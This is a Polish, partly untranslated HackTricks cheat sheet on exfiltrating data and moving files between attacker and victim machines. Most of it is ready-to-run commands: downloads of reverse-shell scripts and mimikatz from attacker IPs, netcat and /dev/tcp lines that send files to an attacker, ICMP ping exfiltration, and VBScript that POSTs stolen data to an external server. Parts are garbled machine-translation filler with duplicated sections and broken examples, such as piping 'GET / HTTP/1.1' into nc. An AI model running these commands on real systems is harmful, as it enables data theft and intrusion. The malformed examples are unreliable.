# Eksfiltracja

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Powszechnie zezwolone domeny do eksfiltracji informacji

Sprawdź [https://lots-project.com/](https://lots-project.com/), aby znaleźć powszechnie zezwolone domeny, które mogą być nadużywane

## Kopiuj i wklej Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Przesyłanie plików

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer drukujący żądania GET i POST (również nagłówki)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Moduł Pythona [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Serwer HTTPS**

An HTTPS server is a secure version of the HTTP protocol that uses encryption to protect the data transmitted between the server and the client. It is commonly used for secure communication over the internet, especially for sensitive information such as passwords, credit card numbers, and personal data.

To exfiltrate data through an HTTPS server, you can use various techniques such as:

- **Data exfiltration via GET requests**: In this method, the data is appended to the URL as query parameters and sent to the server using a GET request. The server can then extract the data from the URL and store it.

- **Data exfiltration via POST requests**: In this method, the data is sent in the body of the HTTP request using a POST request. The server can extract the data from the request body and store it.

- **Data exfiltration via DNS tunneling**: This technique involves encoding the data into DNS queries or responses and sending them to a DNS server. The server can then extract the data from the DNS queries or responses and store it.

- **Data exfiltration via covert channels**: Covert channels are hidden communication channels that can be used to exfiltrate data. This can include techniques such as using steganography to hide data within images or using encryption to hide data within seemingly innocent traffic.

When exfiltrating data through an HTTPS server, it is important to consider the security measures in place, such as SSL/TLS encryption, server-side validation, and access controls. Additionally, it is crucial to ensure that the exfiltrated data is properly encrypted to protect it from unauthorized access.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Serwer FTP (python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Utwórz gniazdo
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Połącz się z serwerem FTP
    s.connect((host, port))
    
    # Otwórz plik do odczytu binarnego
    with open(file_path, 'rb') as file:
        # Pobierz nazwę pliku
        file_name = os.path.basename(file_path)
        
        # Wyślij nazwę pliku do serwera
        s.send(file_name.encode())
        
        # Odczytaj dane z pliku i wyślij je do serwera
        data = file.read(1024)
        while data:
            s.send(data)
            data = file.read(1024)
    
    # Zamknij połączenie
    s.close()

# Przykładowe użycie
send_file('/path/to/file.txt', 'ftp.example.com', 21)
```

Ten kod przedstawia prosty serwer FTP napisany w języku Python.

```python
import socket
import os

def send_file(file_path, host, port):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the FTP server
    s.connect((host, port))
    
    # Open the file for binary reading
    with open(file_path, 'rb') as file:
        # Get the file name
        file_name = os.path.basename(file_path)
        
        # Send the file name to the server
        s.send(file_name.encode())
        
        # Read data from the file and send it to the server
        data = file.read(1024)
        while data:
            s.send(data)
            data = file.read(1024)
    
    # Close the connection
    s.close()

# Example usage
send_file('/path/to/file.txt', 'ftp.example.com', 21)
```

This code presents a simple FTP server written in Python.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Serwer FTP (NodeJS)

#### Description

An FTP (File Transfer Protocol) server is a software application that allows users to transfer files between their local computer and a remote server. In this case, we will focus on a NodeJS-based FTP server.

#### Exfiltration Method

To exfiltrate data from an FTP server, you can use the following steps:

1. Identify the target FTP server and gather information about its configuration, such as the IP address, port number, and authentication method.

2. Use a client application, such as FileZilla or the command-line FTP client, to connect to the FTP server using the gathered information.

3. Authenticate yourself using valid credentials, if required.

4. Navigate to the directory where the desired files are located.

5. Use the appropriate commands to download the files from the FTP server to your local machine. For example, you can use the `get` command in the command-line FTP client or the download option in a graphical client like FileZilla.

6. Monitor the transfer progress and ensure that all desired files are successfully downloaded.

7. Once the files are downloaded, you can analyze and extract any relevant information from them.

#### Mitigation

To mitigate the risk of data exfiltration through an FTP server, consider the following measures:

- Implement strong access controls and authentication mechanisms to prevent unauthorized access to the FTP server.

- Regularly update and patch the FTP server software to address any known vulnerabilities.

- Monitor and log FTP server activities to detect any suspicious or unauthorized file transfers.

- Encrypt the data transferred between the FTP server and clients using secure protocols such as FTPS (FTP over SSL/TLS) or SFTP (SSH File Transfer Protocol).

- Limit the permissions and access rights of FTP server users to only necessary files and directories.

- Consider using alternative file transfer methods, such as secure cloud storage or encrypted file sharing platforms, that provide better security and control over data transfers.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Serwer FTP (pure-ftp)

#### Exfiltration

Exfiltracja

##### FTP Server (pure-ftp)

Serwer FTP (pure-ftp)

###### Description

Opis

Pure-FTP is a popular FTP server that provides a secure and efficient way to transfer files over a network. It supports various authentication methods and encryption protocols, making it a reliable choice for file transfer operations.

Pure-FTP jest popularnym serwerem FTP, który zapewnia bezpieczny i wydajny sposób transferu plików w sieci. Obsługuje różne metody uwierzytelniania i protokoły szyfrowania, co czyni go niezawodnym wyborem do operacji transferu plików.

###### Exfiltration Techniques

Techniki exfiltracji

1. **FTP Upload**: The attacker can upload sensitive files to the FTP server and then retrieve them from a remote location.

   **Przesyłanie FTP**: Atakujący może przesłać poufne pliki na serwer FTP, a następnie pobrać je z odległego miejsca.

2. **FTP Download**: The attacker can download files from the FTP server to their local machine.

   **Pobieranie FTP**: Atakujący może pobrać pliki z serwera FTP na swoje lokalne urządzenie.

3. **FTP Tunneling**: The attacker can establish an FTP tunnel to bypass network restrictions and exfiltrate data.

   **Tunele FTP**: Atakujący może ustanowić tunel FTP, aby ominąć ograniczenia sieciowe i wydostać dane.

###### Countermeasures

Przeciwdziałanie

To prevent unauthorized exfiltration of data through an FTP server, the following countermeasures can be implemented:

Aby zapobiec nieautoryzowanej exfiltracji danych za pośrednictwem serwera FTP, można zastosować następujące środki zaradcze:

1. **Access Control**: Implement strict access controls to restrict FTP server usage to authorized users only.

   **Kontrola dostępu**: Wprowadź rygorystyczną kontrolę dostępu, aby ograniczyć korzystanie z serwera FTP tylko do autoryzowanych użytkowników.

2. **Encryption**: Enable encryption protocols such as SSL/TLS to secure data transmission between the FTP server and clients.

   **Szyfrowanie**: Włącz protokoły szyfrowania, takie jak SSL/TLS, aby zabezpieczyć transmisję danych między serwerem FTP a klientami.

3. **Monitoring**: Implement monitoring mechanisms to detect any suspicious activities or unauthorized access attempts.

   **Monitorowanie**: Wprowadź mechanizmy monitorowania w celu wykrywania podejrzanej aktywności lub prób nieautoryzowanego dostępu.

4. **Regular Updates**: Keep the FTP server software up to date with the latest security patches and updates.

   **Regularne aktualizacje**: Aktualizuj oprogramowanie serwera FTP na bieżąco, instalując najnowsze łatki i aktualizacje zabezpieczeń.

5. **Strong Authentication**: Enforce strong authentication mechanisms, such as multi-factor authentication, to prevent unauthorized access.

   **Silna uwierzytelnianie**: Wprowadź silne mechanizmy uwierzytelniania, takie jak uwierzytelnianie wieloskładnikowe, aby zapobiec nieautoryzowanemu dostępowi.

6. **Network Segmentation**: Implement network segmentation to isolate the FTP server from critical systems and sensitive data.

   **Segmentacja sieci**: Wprowadź segmentację sieci, aby izolować serwer FTP od systemów krytycznych i poufnych danych.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Klient Windows**

#### **Exfiltration Techniques**

##### **1. File Transfer Protocol (FTP)**

FTP is a standard network protocol used to transfer files from one host to another over a TCP-based network, such as the internet. It can be used to exfiltrate data by uploading files from the compromised Windows client to an external FTP server.

##### **2. Hypertext Transfer Protocol (HTTP)**

HTTP is a protocol used for transmitting hypertext over the internet. It can be used to exfiltrate data by sending HTTP requests containing the data from the compromised Windows client to a remote server.

##### **3. Domain Name System (DNS)**

DNS is a hierarchical decentralized naming system used to translate domain names to IP addresses. It can be used to exfiltrate data by encoding the data into DNS queries and sending them from the compromised Windows client to a DNS server controlled by the attacker.

##### **4. Email**

Email can be used to exfiltrate data by sending emails containing the data from the compromised Windows client to a designated email address controlled by the attacker.

##### **5. Cloud Storage Services**

Cloud storage services, such as Dropbox or Google Drive, can be used to exfiltrate data by uploading files from the compromised Windows client to the cloud storage account controlled by the attacker.

##### **6. Remote Access Tools (RATs)**

RATs are software tools that allow remote control and administration of a computer. They can be used to exfiltrate data by establishing a connection between the compromised Windows client and a remote server controlled by the attacker.

##### **7. Steganography**

Steganography is the practice of concealing data within other data, such as hiding a message within an image or audio file. It can be used to exfiltrate data by embedding the data into a file and transferring it from the compromised Windows client to a remote server.

##### **8. USB Devices**

USB devices can be used to exfiltrate data by copying files from the compromised Windows client onto the USB device, which can then be physically transported to a location controlled by the attacker.

##### **9. Printers and Scanners**

Printers and scanners can be used to exfiltrate data by printing or scanning documents containing the data from the compromised Windows client, which can then be physically transported to a location controlled by the attacker.

##### **10. Bluetooth**

Bluetooth can be used to exfiltrate data by establishing a connection between the compromised Windows client and a Bluetooth-enabled device controlled by the attacker, allowing the data to be transferred wirelessly.

#### **Countermeasures**

To prevent exfiltration of data from a compromised Windows client, the following countermeasures can be implemented:

1. Implement strong network security measures, such as firewalls and intrusion detection systems, to monitor and block suspicious network traffic.
2. Regularly update and patch the Windows operating system and installed software to fix any known vulnerabilities.
3. Use strong and unique passwords for all user accounts on the Windows client to prevent unauthorized access.
4. Implement data loss prevention (DLP) solutions to monitor and control the flow of sensitive data within the network.
5. Educate users about the risks of data exfiltration and the importance of following security best practices, such as not opening suspicious email attachments or clicking on unknown links.
6. Monitor and analyze network traffic for any signs of data exfiltration, such as unusual file transfers or abnormal DNS queries.
7. Implement endpoint security solutions, such as antivirus software and host-based intrusion detection systems, to detect and prevent unauthorized access to the Windows client.
8. Disable unnecessary services and protocols on the Windows client to reduce the attack surface and minimize the risk of data exfiltration.
9. Regularly backup important data and store it securely to prevent data loss in case of a successful exfiltration attempt.
10. Conduct regular security assessments and penetration testing to identify and address any vulnerabilities in the Windows client's security posture.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi twoją powierzchnię ataku, przeprowadza proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali jako serwer
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Lub utwórz udział smb **używając samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Windows

## Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of hacking, exfiltration is often used to steal sensitive information or to maintain persistence within a compromised network.

### Techniques

#### 1. File Transfer Protocol (FTP)

FTP is a standard network protocol used for transferring files between a client and a server on a computer network. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.

#### 2. Hypertext Transfer Protocol (HTTP)

HTTP is the protocol used for transmitting hypertext over the internet. Attackers can leverage HTTP to exfiltrate data by sending HTTP requests containing the stolen information to a remote server.

#### 3. Domain Name System (DNS)

DNS is a hierarchical decentralized naming system for computers, services, or other resources connected to the internet. Attackers can abuse DNS to exfiltrate data by encoding the stolen information into DNS queries or responses.

#### 4. Secure Shell (SSH)

SSH is a cryptographic network protocol used for secure remote login and file transfer. Attackers can utilize SSH to exfiltrate data by establishing a connection to a remote server and transferring the stolen files.

#### 5. Cloud Storage Services

Cloud storage services, such as Dropbox or Google Drive, can be exploited by attackers to exfiltrate data. By uploading the stolen files to a cloud storage account, the attacker can access the data from any location.

### Countermeasures

To mitigate the risk of exfiltration, it is important to implement the following countermeasures:

- Implement strong access controls and authentication mechanisms to prevent unauthorized access to sensitive data.
- Monitor network traffic for any suspicious or abnormal data transfers.
- Encrypt sensitive data to protect it from being intercepted during exfiltration attempts.
- Regularly update and patch software to address any known vulnerabilities that could be exploited for exfiltration.
- Implement intrusion detection and prevention systems to detect and block exfiltration attempts.
- Educate employees about the risks of exfiltration and the importance of following security best practices.

By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Atakujący musi mieć uruchomiony SSHd.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Jeśli ofiara ma SSH, atakujący może zamontować katalog z ofiary na swoim komputerze.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) jest potężnym narzędziem do przesyłania danych przez sieć. Może być używany do exfiltracji danych z celu lub do przesyłania danych do celu. Poniżej przedstawiono kilka przykładów użycia NC w celu exfiltracji danych:

### Exfiltracja pliku

Aby exfiltrować plik za pomocą NC, możemy użyć następującej komendy na maszynie docelowej:

```
nc -w 3 <adres_ip> <port> < plik_do_exfiltracji
```

### Exfiltracja danych z pliku

Aby exfiltrować konkretne dane z pliku za pomocą NC, możemy użyć potoku w połączeniu z NC. Na przykład, aby exfiltrować tylko hasła z pliku `/etc/passwd`, możemy użyć następującej komendy:

```
cat /etc/passwd | grep "password" | nc -w 3 <adres_ip> <port>
```

### Exfiltracja danych z urządzenia

NC może być również używany do exfiltracji danych z urządzenia. Na przykład, jeśli chcemy exfiltrować dane z urządzenia mobilnego, możemy użyć następującej komendy:

```
adb shell "cat /data/data/com.example.app/databases/database.db" | nc -w 3 <adres_ip> <port>
```

### Exfiltracja danych z bazy danych

NC może być również używany do exfiltracji danych z bazy danych. Na przykład, jeśli chcemy exfiltrować dane z bazy danych MySQL, możemy użyć następującej komendy:

```
mysqldump -u <użytkownik> -p<hasło> <baza_danych> | nc -w 3 <adres_ip> <port>
```

### Exfiltracja danych z serwera FTP

NC może być również używany do exfiltracji danych z serwera FTP. Na przykład, jeśli chcemy exfiltrować plik `important_file.txt` z serwera FTP, możemy użyć następującej komendy:

```
nc -w 3 <adres_ip> <port> < important_file.txt
```

### Exfiltracja danych z serwera HTTP

NC może być również używany do exfiltracji danych z serwera HTTP. Na przykład, jeśli chcemy exfiltrować zawartość strony internetowej, możemy użyć następującej komendy:

```
GET / HTTP/1.1 | nc -w 3 <adres_ip> <port>
```

### Exfiltracja danych z serwera SMTP

NC może być również używany do exfiltracji danych z serwera SMTP. Na przykład, jeśli chcemy exfiltrować wiadomość e-mail, możemy użyć następującej komendy:

```
EHLO example.com | MAIL FROM: <nadawca> | RCPT TO: <odbiorca> | DATA | nc -w 3 <adres_ip> <port>
```

### Exfiltracja danych z serwera DNS

NC może być również używany do exfiltracji danych z serwera DNS. Na przykład, jeśli chcemy exfiltrować rekordy DNS, możemy użyć następującej komendy:

```
nc -w 3 <adres_ip> <port> <<< "zone example.com"
```

### Exfiltracja danych z serwera LDAP

NC może być również używany do exfiltracji danych z serwera LDAP. Na przykład, jeśli chcemy exfiltrować rekordy LDAP, możemy użyć następującej komendy:

```
nc -w 3 <adres_ip> <port> <<< "search base=<baza_danych> filter=(objectClass=*)"
```

### Exfiltracja danych z serwera SNMP

NC może być również używany do exfiltracji danych z serwera SNMP. Na przykład, jeśli chcemy exfiltrować informacje o urządzeniu SNMP, możemy użyć następującej komendy:

```
nc -w 3 <adres_ip> <port> <<< "get <OID>"
```

### Exfiltracja danych z serwera NTP

NC może być również używany do exfiltracji danych z serwera NTP. Na przykład, jeśli chcemy exfiltrować informacje o serwerze NTP, możemy użyć następującej komendy:

```
nc -w 3 <adres_ip> <port> <<< "monlist"
```

### Exfiltracja danych z serwera SNMP

NC może być również używany do exfiltracji danych z serwera SNMP. Na przykład, jeśli chcemy exfiltrować informacje o urządzeniu SNMP, możemy użyć następującej komendy:

```
nc -w 3 <adres_ip> <port> <<< "get <OID>"
```

### Exfiltracja danych z serwera NTP

NC może być również używany do exfiltracji danych z serwera NTP. Na przykład, jeśli chcemy exfiltrować informacje o serwerze NTP, możemy użyć następującej komendy:

```
nc -w 3 <adres_ip> <port> <<< "monlist"
```
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat <file> > /dev/tcp/<attacker_ip>/<attacker_port>
```

Replace `<file>` with the path of the file you want to download, `<attacker_ip>` with your IP address, and `<attacker_port>` with the port you want to use for the connection.

For example, to download a file named `important.txt` to your machine with the IP address `192.168.0.100` and using port `1234`, you would use the following command:

```bash
cat important.txt > /dev/tcp/192.168.0.100/1234
```

This command will send the contents of the file to the specified IP address and port, allowing you to download it on your machine.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Prześlij plik do ofiary

Aby przesłać plik do ofiary, możesz skorzystać z różnych metod. Poniżej przedstawiam kilka popularnych sposobów:

1. **Bezpośrednie przesłanie**: Jeśli masz dostęp do systemu ofiary, możesz skorzystać z polecenia `scp` (Secure Copy) lub `sftp` (Secure File Transfer Protocol), aby przesłać plik bezpośrednio na jej maszynę. Na przykład, jeśli chcesz przesłać plik o nazwie `file.txt` na adres IP `192.168.0.100`, możesz użyć polecenia:
   ```
   scp file.txt user@192.168.0.100:/path/to/destination
   ```
   Upewnij się, że masz odpowiednie uprawnienia do przesyłania plików na maszynę ofiary.

2. **Wykorzystanie usług chmurowych**: Jeśli nie masz bezpośredniego dostępu do systemu ofiary, możesz skorzystać z usług chmurowych, takich jak Dropbox, Google Drive lub OneDrive. Prześlij plik na swoje konto w wybranej usłudze, a następnie udostępnij go ofierze, udostępniając jej odpowiedni link.

3. **Wykorzystanie serwera pośredniczącego**: Możesz również skorzystać z serwera pośredniczącego, który działa jako most pomiędzy twoim systemem a systemem ofiary. Możesz skonfigurować serwer pośredniczący, na przykład przy użyciu narzędzia `ngrok`, aby przekierować ruch sieciowy z twojego systemu na system ofiary. Następnie możesz przesłać plik na serwer pośredniczący i udostępnić go ofierze, udostępniając jej odpowiedni link.

Pamiętaj, że przesyłanie plików do ofiary bez jej zgody jest nielegalne i narusza prywatność. Upewnij się, że działasz zgodnie z obowiązującymi przepisami i zawsze respektuj prywatność innych osób.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Dzięki **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Jeśli możesz wysyłać dane do serwera SMTP, możesz utworzyć serwer SMTP do odbierania danych za pomocą Pythona:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Domyślnie w systemach XP i 2003 (w innych systemach musi być jawnie dodany podczas instalacji)

W Kali, **uruchom serwer TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Serwer TFTP w Pythonie:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 69))

    while True:
        data, addr = sock.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the read request and send the file
            # ...

        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the write request and receive the file
            # ...

        else:
            # Invalid opcode
            # ...

tftp_server()
```

This code snippet shows how to create a TFTP server in Python. The server listens for incoming UDP packets on port 69. When a packet is received, the opcode is extracted from the packet header. If the opcode is 1, it means a read request has been received, and the server can process the request and send the requested file. If the opcode is 2, it means a write request has been received, and the server can process the request and receive the file. Any other opcode is considered invalid and can be handled accordingly.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
W **ofiarze**, połącz się z serwerem Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Pobierz plik za pomocą jednolinijkowego kodu PHP:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) jest językiem skryptowym opartym na Visual Basic, który jest używany do tworzenia skryptów wykonywanych w środowisku Windows. Jest to popularny język skryptowy używany w celu automatyzacji zadań, tworzenia makr i rozszerzania funkcjonalności aplikacji.

### Wykorzystanie VBScript w celu eksfiltracji danych

VBScript może być również wykorzystywany w celu eksfiltracji danych z systemu. Istnieje wiele technik, które można zastosować w tym celu. Oto kilka przykładów:

#### Wykorzystanie funkcji `CreateObject`

Funkcja `CreateObject` w VBScript może być używana do tworzenia obiektów COM (Component Object Model). Można jej użyć do nawiązania połączenia z zewnętrznym serwerem i przesłania danych. Na przykład:

```vbscript
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "POST", "http://adres-serwera.com/endpoint", False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objXMLHTTP.send "data=skradzione-dane"
```

#### Wykorzystanie funkcji `FileSystemObject`

Funkcja `FileSystemObject` w VBScript umożliwia manipulację plikami i folderami na systemie. Można jej użyć do odczytu danych z pliku i przesłania ich na zewnętrzny serwer. Na przykład:

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\sciezka-do-pliku.txt", 1)
data = objFile.ReadAll
objFile.Close

Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "POST", "http://adres-serwera.com/endpoint", False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objXMLHTTP.send "data=" & data
```

#### Wykorzystanie funkcji `WScript.Shell`

Funkcja `WScript.Shell` w VBScript umożliwia wykonywanie poleceń systemowych. Można jej użyć do uruchomienia polecenia, które przesłałoby dane na zewnętrzny serwer. Na przykład:

```vbscript
Set objShell = CreateObject("WScript.Shell")
command = "curl -X POST -d 'data=skradzione-dane' http://adres-serwera.com/endpoint"
objShell.Run command, 0, True
```

### Podsumowanie

VBScript jest potężnym narzędziem, które może być wykorzystane do eksfiltracji danych z systemu. Wykorzystując funkcje takie jak `CreateObject`, `FileSystemObject` i `WScript.Shell`, można przesłać skradzione dane na zewnętrzny serwer. Pamiętaj jednak, że wykorzystywanie VBScript do nielegalnych działań jest niezgodne z prawem i może prowadzić do konsekwencji prawnych.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Ofiara**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
